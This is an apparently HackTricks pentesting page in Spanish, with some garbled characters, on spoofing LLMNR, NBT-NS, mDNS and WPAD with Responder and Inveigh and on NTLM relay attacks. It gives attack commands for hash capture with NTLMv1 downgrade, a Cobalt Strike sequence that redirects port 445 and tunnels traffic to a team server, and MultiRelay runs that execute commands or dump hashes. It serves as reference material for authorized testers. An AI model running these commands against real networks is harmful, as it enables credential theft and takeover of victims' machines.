# Suplantaci贸n en LLMNR, NBT-NS, mDNS/DNS y WPAD y Ataques de Relevo

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Protocolos de Red

### Protocolos de Resoluci贸n de Host Local
- **LLMNR, NBT-NS y mDNS**:
- Microsoft y otros sistemas operativos utilizan LLMNR y NBT-NS para la resoluci贸n de nombres locales cuando falla el DNS. De manera similar, los sistemas de Apple y Linux utilizan mDNS.
- Estos protocolos son susceptibles a la interceptaci贸n y suplantaci贸n debido a su naturaleza de difusi贸n no autenticada sobre UDP.
- [Responder](https://github.com/lgandx/Responder) se puede utilizar para suplantar servicios enviando respuestas falsificadas a hosts que consultan estos protocolos.
- Se puede encontrar m谩s informaci贸n sobre la suplantaci贸n de servicios utilizando Responder [aqu铆](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Protocolo de Descubrimiento Autom谩tico de Proxy Web (WPAD)
- WPAD permite a los navegadores descubrir la configuraci贸n de proxy autom谩ticamente.
- El descubrimiento se facilita a trav茅s de DHCP, DNS, o en caso de fallo de DNS, mediante LLMNR y NBT-NS.
- Responder puede automatizar ataques WPAD, dirigiendo a los clientes a servidores WPAD maliciosos.

### Responder para Envenenamiento de Protocolos
- **Responder** es una herramienta utilizada para envenenar consultas LLMNR, NBT-NS y mDNS, respondiendo selectivamente seg煤n los tipos de consulta, apuntando principalmente a servicios SMB.
- Viene preinstalado en Kali Linux, configurable en `/etc/responder/Responder.conf`.
- Responder muestra las hashes capturadas en la pantalla y las guarda en el directorio `/usr/share/responder/logs`.
- Es compatible con IPv4 e IPv6.
- La versi贸n de Windows de Responder est谩 disponible [aqu铆](https://github.com/lgandx/Responder-Windows).

#### Ejecuci贸n de Responder
- Para ejecutar Responder con la configuraci贸n predeterminada: `responder -I <Interfaz>`
- Para sondeos m谩s agresivos (con posibles efectos secundarios): `responder -I <Interfaz> -P -r -v`
- T茅cnicas para capturar desaf铆os/respuestas NTLMv1 para una descifrado m谩s f谩cil: `responder -I <Interfaz> --lm --disable-ess`
- La suplantaci贸n de WPAD se puede activar con: `responder -I <Interfaz> --wpad`
- Las solicitudes de NetBIOS se pueden resolver a la IP del atacante, y se puede configurar un proxy de autenticaci贸n: `responder.py -I <interfaz> -Pv`

### Envenenamiento DHCP con Responder
- La suplantaci贸n de respuestas DHCP puede envenenar permanentemente la informaci贸n de enrutamiento de una v铆ctima, ofreciendo una alternativa m谩s sigilosa al envenenamiento ARP.
- Requiere un conocimiento preciso de la configuraci贸n de red del objetivo.
- Para ejecutar el ataque: `./Responder.py -I eth0 -Pdv`
- Este m茅todo puede capturar eficazmente hashes NTLMv1/2, pero requiere un manejo cuidadoso para evitar interrupciones en la red.

### Captura de Credenciales con Responder
- Responder suplantar谩 servicios utilizando los protocolos mencionados anteriormente, capturando credenciales (generalmente Desaf铆o/Respuesta NTLMv2) cuando un usuario intente autenticarse contra los servicios falsificados.
- Se pueden realizar intentos para degradar a NetNTLMv1 o deshabilitar ESS para facilitar el descifrado de credenciales.

Es crucial tener en cuenta que el uso de estas t茅cnicas debe realizarse de manera legal y 茅tica, asegurando la autorizaci贸n adecuada y evitando la interrupci贸n o el acceso no autorizado.

## Inveigh

Inveigh es una herramienta para pentesters y equipos de red, dise帽ada para sistemas Windows. Ofrece funcionalidades similares a Responder, realizando suplantaciones y ataques de intermediario. La herramienta ha evolucionado desde un script de PowerShell a un binario de C#, con [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) y [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) como las principales versiones. Se pueden encontrar par谩metros detallados e instrucciones en la [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh se puede operar a trav茅s de PowerShell:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
O ejecutado como un binario de C#:
```bash
Inveigh.exe
```
### Ataque de Relevo NTLM

Este ataque aprovecha sesiones de autenticaci贸n SMB para acceder a una m谩quina objetivo, otorgando un shell del sistema si tiene 茅xito. Los requisitos clave incluyen:
- El usuario autenticado debe tener acceso de Administrador Local en el host de retransmisi贸n.
- La firma SMB debe estar deshabilitada.

#### Reenv铆o y Tunelizaci贸n del Puerto 445

En escenarios donde la introducci贸n directa a la red no es factible, el tr谩fico en el puerto 445 debe ser reenviado y tunelizado. Herramientas como [**PortBender**](https://github.com/praetorian-inc/PortBender) ayudan a redirigir el tr谩fico del puerto 445 a otro puerto, lo cual es esencial cuando se dispone de acceso de administrador local para la carga de controladores.

Configuraci贸n y operaci贸n de PortBender en Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Otras Herramientas para Ataques de Relevo NTLM

- **Metasploit**: Configurado con proxies, detalles del host local y remoto.
- **smbrelayx**: Un script de Python para rel茅 de sesiones SMB y ejecutar comandos o desplegar puertas traseras.
- **MultiRelay**: Una herramienta de la suite Responder para rel茅 de usuarios espec铆ficos o todos los usuarios, ejecutar comandos o volcar hashes.

Cada herramienta se puede configurar para operar a trav茅s de un proxy SOCKS si es necesario, permitiendo ataques incluso con acceso de red indirecto.

### Operaci贸n de MultiRelay

MultiRelay se ejecuta desde el directorio _**/usr/share/responder/tools**_, apuntando a IPs o usuarios espec铆ficos.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Estas herramientas y t茅cnicas forman un conjunto completo para llevar a cabo ataques de retransmisi贸n NTLM en diversos entornos de red.

### Forzar Inicios de Sesi贸n NTLM

En Windows **puede ser posible forzar a algunas cuentas privilegiadas a autenticarse en m谩quinas arbitrarias**. Lee la siguiente p谩gina para aprender c贸mo:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Referencias
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
